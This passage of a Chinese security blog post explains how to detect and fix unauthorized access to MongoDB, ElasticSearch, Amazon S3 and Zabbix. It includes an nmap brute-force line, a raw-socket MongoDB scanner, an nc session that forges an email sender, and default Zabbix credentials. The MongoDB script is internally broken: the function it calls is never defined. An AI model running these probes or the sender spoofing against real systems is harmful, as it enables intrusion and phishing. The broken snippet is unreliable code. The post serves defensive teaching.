+<p><img src="https://images.atsud0.me/images/post/image-20201121090914555.png" alt="image-20201121090914555"></p>
+<blockquote>
+<p>doesn’t use authentication 就是存在未授权访问</p>
+</blockquote>
+<h3 id="其他探测工具"><a href="#其他探测工具" class="headerlink" title="其他探测工具"></a>其他探测工具</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 27017 --script&#x3D;mongodb-brute.nse -sV 10.170.0.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201121091600632.png" alt="image-20201121091600632"></p>
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><blockquote>
+<p>网上流传的各类Python检测脚本，主要检测方式是以下两种：</p>
+<p> 1.一种检测方式是使用Python的PyMongo库，不使用账号密码连接MongoDB服务，连接成功则证明存在未授权访问漏洞。由于PyMongo库只支持MongoDB 2.6及之后版本，低版本MongoDB存在漏洞时无法发现。</p>
+<p>2.另一种检测方式是使用socket与MongoDB服务端口建立连接后发送数据库查询指令，返回的数据中，存在默认库<code>local</code>，则表示数据库查询成功，存在未授权访问漏洞。在1.9版本的MongoDB服务中，报错信息中包含local字符，引起误报。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本代码来自:https://www.freebuf.com/vuls/212799.html</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mongodb</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">27017</span>))        s.send(<span class="string">'\x3F\x00\x00\x00\x7E\x00\x00\x00\x00\x00\x00\x00\xD4\x07\x00\x00\x04\x00\x00\x00\x61\x64\x6D\x69\x6E\x2E\x24\x63\x6D\x64\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x18\x00\x00\x00\x10\x6C\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00'</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'local'</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">'errmsg'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:  <span class="comment">#增加一个“errmsg”字符串判断，避免1.9版本中的误报。</span></span><br><span class="line">            print(<span class="string">u'&#123;&#125;[+] &#123;&#125;:27017\tMongoDB存在未授权访问&#123;&#125;'</span>.format(G, ip, W))</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'weakpass.txt'</span>, <span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">'&#123;&#125;\t27017\tMongoDB存在未授权访问\n'</span>.format(ip,))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mongodb_check(<span class="string">"192.168.1.10"</span>,<span class="string">"27017"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="本地监听"><a href="#本地监听" class="headerlink" title="本地监听"></a>本地监听</h4><p>只在本地使用的话，只监听本地，使用<code>--bind_ip 127.0.0.1</code>绑定监听地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --bind_ip 127.0.0.1 --dbpath &#x2F;tmp&#x2F;test</span><br></pre></td></tr></table></figure>
+
+<p>配置文件修改 <code>/etc/mongod.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># network interfaces</span><br><span class="line">net:</span><br><span class="line">  port: 27017</span><br><span class="line">  bindIp: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h4 id="防火墙限制访问源"><a href="#防火墙限制访问源" class="headerlink" title="防火墙限制访问源"></a>防火墙限制访问源</h4><p>使用<code>iptables</code>/<code>firewalld</code>什么的控制访问源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;ip-address&gt; -p tcp --destination-port 27017 -m state --state NEW,ESTABLISHED -j ACCEPT <span class="comment"># 入站</span></span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -d &lt;ip-address&gt; -p tcp --<span class="built_in">source</span>-port 27017 -m state --state ESTABLISHED -j ACCEPT <span class="comment"># 出站</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-rich-rule&#x3D;&quot;rule family&#x3D;&quot;ipv4&quot; source address&#x3D;&quot;&lt;ip-address&gt;&quot; port protocol&#x3D;&quot;tcp&quot; port&#x3D;&quot;27017&quot; accept&quot;</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">firewall-cmd --list-rich-rule</span><br><span class="line"></span><br><span class="line">如果要指定对应区域的话，再加个--zone&#x3D;Public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 删除规则</span><br><span class="line">firewall-cmd --permanent --remove-rich-rule&#x3D;&quot;rule family&#x3D;&quot;ipv4&quot; source address&#x3D;&quot;&lt;ip-address&gt;&quot; port protocol&#x3D;&quot;tcp&quot; port&#x3D;&quot;27017&quot; accept&quot;</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+
+<h4 id="设置认证"><a href="#设置认证" class="headerlink" title="设置认证"></a>设置认证</h4><blockquote>
+<p>MongoDB 3.0及以上版本启动时添加<code>--auth</code>参数开启认证访问，此时若数据库中无账号，本地登录则无权限进行任何操作，因此需要先以无认证的方式启动服务并创建系统用户管理员账号。</p>
+</blockquote>
+<ol>
+<li><p><strong>以无访问认证的方式启动MongoDB</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath /data/db</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>未开启认证的环境下，登录到数据库</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>创建系统用户管理员</strong></p>
+<p>创建一个用户名为<code>myUserAdmin</code>，密码为<code>Passw0rd</code>的系统用户管理员账号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#切换到admin库：</span><br><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line"></span><br><span class="line">#创建用户</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">  &#123;</span><br><span class="line">    user: &quot;myUserAdmin&quot;,</span><br><span class="line">    pwd: &quot;Passw0rd&quot;,</span><br><span class="line">    roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#创建成功后提示信息：</span><br><span class="line">Successfully added user: &#123;</span><br><span class="line">    &quot;user&quot; : &quot;myUserAdmin&quot;,</span><br><span class="line">    &quot;roles&quot; : [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;role&quot; : &quot;userAdminAnyDatabase&quot;,</span><br><span class="line">            &quot;db&quot; : &quot;admin&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 说明：3.0之前版本使用db.addUser方法创建用户。 </p>
+</blockquote>
+</li>
+<li><p><strong>重启MongoDB服务，开启访问认证</strong></p>
+<p>启动时添加<code>--auth</code>参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --auth --port 27017 --dbpath /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p> 或：在配置文件中添加以下内容，指定配置文件启动服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#security:</span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure>
+
+<p> 指定配置文件启动MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mongod --config /etc/mongod.conf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用系统用户管理员账号登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27017 -u <span class="string">"myUserAdmin"</span> -p <span class="string">"Passw0rd"</span> --authenticationDatabase <span class="string">"admin"</span></span><br></pre></td></tr></table></figure>
+
+<p>不明文的方式，先连接数据库，在用db.auth进行认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line">&gt; db.auth(&quot;myUserAdmin&quot;,&quot;Passw0rd&quot;)</span><br><span class="line">1  #返回1，表示认证成功</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>创建数据库用户</strong>创建完系统用户管理员账号并通过系统用户管理员登陆后，对每个库创建指定的用户。下面以对products库创建一个具有读写权限的用户accountUser为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; use products</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">   &#123;</span><br><span class="line">     user: &quot;accountUser&quot;,</span><br><span class="line">     pwd: &quot;password&quot;,</span><br><span class="line">     roles: [ &quot;readWrite&quot;, &quot;dbAdmin&quot; ]</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#用户创建成功</span><br><span class="line">Successfully added user: &#123; &quot;user&quot; : &quot;accountUser&quot;, &quot;roles&quot; : [ &quot;readWrite&quot;, &quot;dbAdmin&quot; ] &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用数据库用户访问指定库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mongo --port 27017 -u &quot;accountUser&quot; -p &quot;password&quot; --authenticationDatabase &quot;products&quot;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="本节参考链接-1"><a href="#本节参考链接-1" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
+<li><a href="https://www.freebuf.com/vuls/212799.html" target="_blank" rel="noopener">MongoDB未授权访问漏洞分析及整改建议</a></li>
+</ul>
+<h2 id="邮件服务器未授权访问伪造发件人"><a href="#邮件服务器未授权访问伪造发件人" class="headerlink" title="邮件服务器未授权访问伪造发件人"></a>邮件服务器未授权访问伪造发件人</h2><p>某台邮件服务器25端口开放。</p>
+<p>可以直接用nc连接，进行伪造邮件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HELO aaa.com </span><br><span class="line">250 debian</span><br><span class="line">EHLO aaa.com <span class="comment"># 返回250状态码，还返回自己支持各种扩展的列表</span></span><br><span class="line">250 xxxx</span><br><span class="line">250 xxxx </span><br><span class="line">MAIL FROM:admin@admin.com <span class="comment"># 伪造admin发信人</span></span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO:jack@admin.com <span class="comment"># 收信人</span></span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">------正文------</span><br><span class="line">. <span class="comment"># 结束符</span></span><br><span class="line">250 2.0.0 Ok: queued as C7DE122470</span><br><span class="line">QUIT</span><br><span class="line">221 2.0.0 Bye</span><br></pre></td></tr></table></figure>
+
+<p>完整流程图</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201125194127839.png" alt="image-20201125194127839"></p>
+<p>其实msf里面也有模块可以直接利用啦</p>
+<h2 id="ElasticSearch未授权访问"><a href="#ElasticSearch未授权访问" class="headerlink" title="ElasticSearch未授权访问"></a>ElasticSearch未授权访问</h2><p>默认开放9200端口，用于提供远程管理数据的功能。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查。</p>
+<p>直接访问该端口，出信息就是存在未授权了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.105.25:9200</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>防火墙限制访问源</li>
+<li>在config/elasticsearch.yml中为9200端口设置认证，相关配置参数可参考：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http.basic.enabled true #启动认证，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user "admin" #配置认证账号</span><br><span class="line">http.basic.password "admin_pw" #配置认证密码</span><br><span class="line">http.basic.ipwhitelist [<span class="string">"localhost"</span>, <span class="string">"127.0.0.1"</span>]</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证。</li>
+</ol>
+<h2 id="Amazon-S3-未授权访问"><a href="#Amazon-S3-未授权访问" class="headerlink" title="Amazon S3 未授权访问"></a>Amazon S3 未授权访问</h2><p>这里用了<code>hack the box</code>的<code>bucket</code>靶机来做事例。</p>
+<h3 id="aws-cli"><a href="#aws-cli" class="headerlink" title="aws-cli"></a>aws-cli</h3><p>使用aws-cli工具可以直接获取配置错误的bucket桶。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3:&#x2F;&#x2F; --no-sign-request --endpoint-url http:&#x2F;&#x2F;s3.bucket.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201123185727734.png" alt="image-20201123185727734"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201123185754857.png" alt="image-20201123185754857"></p>
+<h3 id="curl-burp-浏览器"><a href="#curl-burp-浏览器" class="headerlink" title="curl/burp/浏览器"></a>curl/burp/浏览器</h3><p>直接访问 <code>/</code>即可</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201123185844024.png" alt="image-20201123185844024"></p>
+<p>这里靶机环境不同，需要访问<code>/?1/?</code>但是官方api文档中是直接访问s3服务的根路径，就能获取所有桶了。直接访问<code>/bucket-name/?acl</code></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201123190038963.png" alt="image-20201123190038963"></p>
+<p>如图所示，目标的acl没被正确配置，可以被未授权用户访问</p>
+<h2 id="SpringBoot-Actuator配置不当未授权访问"><a href="#SpringBoot-Actuator配置不当未授权访问" class="headerlink" title="SpringBoot Actuator配置不当未授权访问"></a>SpringBoot Actuator配置不当未授权访问</h2><h3 id="本节参考链接-2"><a href="#本节参考链接-2" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
+<li><p><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener">Springboot之actuator配置不当的漏洞利用</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p>
+</li>
+<li><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">Exploiting Spring Boot Actuators</a></p>
+</li>
+<li><p><a href="https://cloud.tencent.com/developer/article/1353426" target="_blank" rel="noopener">SpringCloud组件：你的Eureka服务注册中心安全吗？</a></p>
+</li>
+<li><p>[Spring Boot Actuators配置不当导致RCE漏洞复现](<a href="https://jianfensec.com/漏洞复现/Spring" target="_blank" rel="noopener">https://jianfensec.com/漏洞复现/Spring</a> Boot Actuators配置不当导致RCE漏洞复现/)</p>
+</li>
+</ul>
+<h2 id="Kubernetes-未授权"><a href="#Kubernetes-未授权" class="headerlink" title="Kubernetes  未授权"></a>Kubernetes  未授权</h2><h3 id="本节参考链接-3"><a href="#本节参考链接-3" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><h2 id="Zabbix控制面板默认口令"><a href="#Zabbix控制面板默认口令" class="headerlink" title="Zabbix控制面板默认口令"></a>Zabbix控制面板默认口令</h2><p>默认管理员账号：zabbix<br>默认管理员密码：zabbix</p>
+<p>如果顺利的话，就能直接登陆到zabbix服务端的后台。</p>
+<p>游客访问的话没什么用。大部分资源默认配置的都是得管理员账号登陆才能看的到，至少我没看到有一个弱口令的zabbix，游客访问能看到什么东西的。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/11/20/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="未授权漏洞复现">http://atsud0.me/2020/11/20/未授权漏洞复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/redis/" rel="tag"><i class="fa fa-tag"></i> redis</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/17/%E5%8D%8E%E5%AE%9C%E7%BD%91%E7%BB%9C%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/" rel="prev" title="华宜网络后台默认密码">
+      <i class="fa fa-chevron-left"></i> 华宜网络后台默认密码
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/11/25/HackTheBox-Bucket/" rel="next" title="HackTheBox-Bucket">
+      HackTheBox-Bucket <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis"><span class="nav-number">1.</span> <span class="nav-text">Redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab-反弹shell"><span class="nav-number">1.1.</span> <span class="nav-text">crontab 反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写webshell"><span class="nav-number">1.2.</span> <span class="nav-text">写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入ssh-keygen公钥"><span class="nav-number">1.3.</span> <span class="nav-text">写入ssh-keygen公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eval-执行lua脚本"><span class="nav-number">1.4.</span> <span class="nav-text">eval 执行lua脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-unacc-主从复制"><span class="nav-number">1.5.</span> <span class="nav-text">4-unacc 主从复制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#自动化攻击"><span class="nav-number">1.5.1.</span> <span class="nav-text">自动化攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#手动复现过程"><span class="nav-number">1.5.2.</span> <span class="nav-text">手动复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ssrf-getshell"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">ssrf getshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gopher-getshell"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">gopher getshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">1.6.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本节参考链接"><span class="nav-number">1.7.</span> <span class="nav-text">本节参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mongo"><span class="nav-number">2.</span> <span class="nav-text">Mongo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞验证"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他探测工具"><span class="nav-number">2.2.</span> <span class="nav-text">其他探测工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">2.2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python"><span class="nav-number">2.2.2.</span> <span class="nav-text">python</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方案"><span class="nav-number">2.3.</span> <span class="nav-text">修复方案</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地监听"><span class="nav-number">2.3.1.</span> <span class="nav-text">本地监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防火墙限制访问源"><span class="nav-number">2.3.2.</span> <span class="nav-text">防火墙限制访问源</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#设置认证"><span class="nav-number">2.3.3.</span> <span class="nav-text">设置认证</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本节参考链接-1"><span class="nav-number">2.4.</span> <span class="nav-text">本节参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#邮件服务器未授权访问伪造发件人"><span class="nav-number">3.</span> <span class="nav-text">邮件服务器未授权访问伪造发件人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ElasticSearch未授权访问"><span class="nav-number">4.</span> <span class="nav-text">ElasticSearch未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">4.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Amazon-S3-未授权访问"><span class="nav-number">5.</span> <span class="nav-text">Amazon S3 未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#aws-cli"><span class="nav-number">5.1.</span> <span class="nav-text">aws-cli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-burp-浏览器"><span class="nav-number">5.2.</span> <span class="nav-text">curl&#x2F;burp&#x2F;浏览器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpringBoot-Actuator配置不当未授权访问"><span class="nav-number">6.</span> <span class="nav-text">SpringBoot Actuator配置不当未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本节参考链接-2"><span class="nav-number">6.1.</span> <span class="nav-text">本节参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kubernetes-未授权"><span class="nav-number">7.</span> <span class="nav-text">Kubernetes  未授权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本节参考链接-3"><span class="nav-number">7.1.</span> <span class="nav-text">本节参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zabbix控制面板默认口令"><span class="nav-number">8.</span> <span class="nav-text">Zabbix控制面板默认口令</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
